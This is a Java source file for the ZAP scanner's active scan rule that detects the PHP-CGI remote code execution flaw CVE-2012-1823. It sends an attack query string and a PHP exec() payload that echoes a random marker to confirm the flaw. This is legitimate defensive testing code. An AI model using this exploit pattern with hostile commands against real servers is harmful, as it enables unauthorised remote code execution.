/*
 * Zed Attack Proxy (ZAP) and its related class files.
 *
 * ZAP is an HTTP/HTTPS proxy for assessing web application security.
 *
 * Copyright 2014 The ZAP Development Team
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.zaproxy.zap.extension.ascanrulesBeta;

import org.apache.commons.httpclient.URI;
import org.apache.commons.httpclient.URIException;
import org.apache.commons.lang.RandomStringUtils;
import org.apache.log4j.Logger;
import org.parosproxy.paros.Constant;
import org.parosproxy.paros.core.scanner.AbstractAppPlugin;
import org.parosproxy.paros.core.scanner.Alert;
import org.parosproxy.paros.core.scanner.Category;
import org.parosproxy.paros.network.HttpMessage;
import org.parosproxy.paros.network.HttpRequestHeader;
import org.zaproxy.zap.model.Tech;
import org.zaproxy.zap.model.TechSet;
import org.zaproxy.zap.model.Vulnerabilities;
import org.zaproxy.zap.model.Vulnerability;

/**
 * a scan rule that looks for, and exploits CVE-2012-1823 to perform Remote Code Execution on a
 * PHP-CGI web server
 *
 * @author 70pointer
 */
public class RemoteCodeExecutionCve20121823ScanRule extends AbstractAppPlugin {

    /**
     * details of the vulnerability which we are attempting to find WASC 20 = Improper Input
     * Handling
     */
    private static final Vulnerability vuln = Vulnerabilities.getVulnerability("wasc_20");

    /** the logger object */
    private static final Logger log =
            Logger.getLogger(RemoteCodeExecutionCve20121823ScanRule.class);

    /** a random string (which remains constant across multiple runs, as long as Zap is not */
    static final String RANDOM_STRING =
            RandomStringUtils.random(20, "abcdefghijklmnopqrstuvwxyz0123456789");

    private static final String ATTACK_PARAM =
            "?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input";
    private static final String PAYLOAD_BOILERPLATE =
            "<?php exec('<<<<COMMAND>>>>',$colm);echo join(\"\n\",$colm);die();?>";

    private static final String WIN_PAYLOAD =
            PAYLOAD_BOILERPLATE.replace("<<<<COMMAND>>>>", "cmd.exe /C echo " + RANDOM_STRING);
    private static final String NIX_PAYLOAD =
            PAYLOAD_BOILERPLATE.replace("<<<<COMMAND>>>>", "echo " + RANDOM_STRING);

    @Override
    public int getId() {
        return 20018;
    }

    @Override
    public String getName() {
        return Constant.messages.getString("ascanbeta.remotecodeexecution.cve-2012-1823.name");
    }

    @Override
    public boolean targets(TechSet technologies) {
        if (technologies.includes(Tech.PHP)) {
            return true;
        }
        return false;
    }

    @Override
    public String getDescription() {
        if (vuln != null) {
            return vuln.getDescription();
        }
        return "Failed to load vulnerability description from file";
    }

    @Override
    public int getCategory() {
        return Category.INFO_GATHER;
    }

    @Override
    public String getSolution() {
        if (vuln != null) {
            return vuln.getSolution();
        }
        return "Failed to load vulnerability solution from file";
    }

    @Override
    public String getReference() {
        if (vuln != null) {
            StringBuilder sb = new StringBuilder();
            for (String ref : vuln.getReferences()) {
                if (sb.length() > 0) {
                    sb.append('\n');
                }
                sb.append(ref);
            }
            return sb.toString();
        }
        return "Failed to load vulnerability reference from file";
    }

    @Override
    public void scan() {
        URI originalURI = getBaseMsg().getRequestHeader().getURI();
        // construct a new URL based on the original URL, but without any of the original parameters
        URI attackURI = createAttackUri(originalURI, ATTACK_PARAM);
        if (attackURI == null) {
            return;
        }

        if (inScope(Tech.Windows)) {
            if (scan(originalURI, attackURI, WIN_PAYLOAD)) {
                return;
            }
        }

        if (isStop()) {
            return;
        }

        if (inScope(Tech.Linux) || inScope(Tech.MacOS)) {
            scan(originalURI, attackURI, NIX_PAYLOAD);
        }
    }

    private boolean scan(URI originalURI, URI attackURI, String payload) {
        try {
            // send it as a POST request, unauthorised, with the payload as the POST body.
            HttpRequestHeader requestHeader =
                    new HttpRequestHeader(
                            HttpRequestHeader.POST, attackURI, HttpRequestHeader.HTTP11);
            HttpMessage attackmsg = new HttpMessage(requestHeader);
            attackmsg.setRequestBody(payload);
            requestHeader.setContentLength(attackmsg.getRequestBody().length());

            sendAndReceive(attackmsg, false); // do not follow redirects
            byte[] attackResponseBody = attackmsg.getResponseBody().getBytes();
            String responseBody = new String(attackResponseBody);

            // if the command was not recognised (by the host OS), we get a response size of 0 on
            // PHP, but not on Tomcat
            // to be sure it's not a false positive, we look for a string to be echoed
            if (isPage200(attackmsg)
                    && attackResponseBody.length >= RANDOM_STRING.length()
                    && responseBody.startsWith(RANDOM_STRING)) {
                if (log.isDebugEnabled()) {
                    log.debug("Remote Code Execution alert for: " + originalURI.getURI());
                }

                // bingo.
                newAlert()
                        .setConfidence(Alert.CONFIDENCE_MEDIUM)
                        .setDescription(
                                Constant.messages.getString(
                                        "ascanbeta.remotecodeexecution.cve-2012-1823.desc"))
                        .setAttack(payload)
                        .setOtherInfo(responseBody)
                        .setSolution(
                                Constant.messages.getString(
                                        "ascanbeta.remotecodeexecution.cve-2012-1823.soln"))
                        .setEvidence(responseBody)
                        .setMessage(attackmsg)
                        .raise();
                return true;
            }
        } catch (Exception e) {
            log.error(
                    "Error scanning a URL for Remote Code Execution via CVE-2012-1823: "
                            + e.getMessage(),
                    e);
        }
        return false;
    }

    private static URI createAttackUri(URI originalURI, String attackParam) {
        StringBuilder strBuilder = new StringBuilder();
        strBuilder
                .append(originalURI.getScheme())
                .append("://")
                .append(originalURI.getEscapedAuthority());
        strBuilder
                .append(originalURI.getRawPath() != null ? originalURI.getEscapedPath() : "/")
                .append(attackParam);
        String uri = strBuilder.toString();
        try {
            return new URI(uri, true);
        } catch (URIException e) {
            log.warn("Failed to create attack URI [" + uri + "], cause: " + e.getMessage());
        }
        return null;
    }

    @Override
    public int getRisk() {
        return Alert.RISK_HIGH;
    }

    @Override
    public int getCweId() {
        return 20; // Improper Input Validation
    }

    @Override
    public int getWascId() {
        return 20; // Improper Input Handling
    }
}
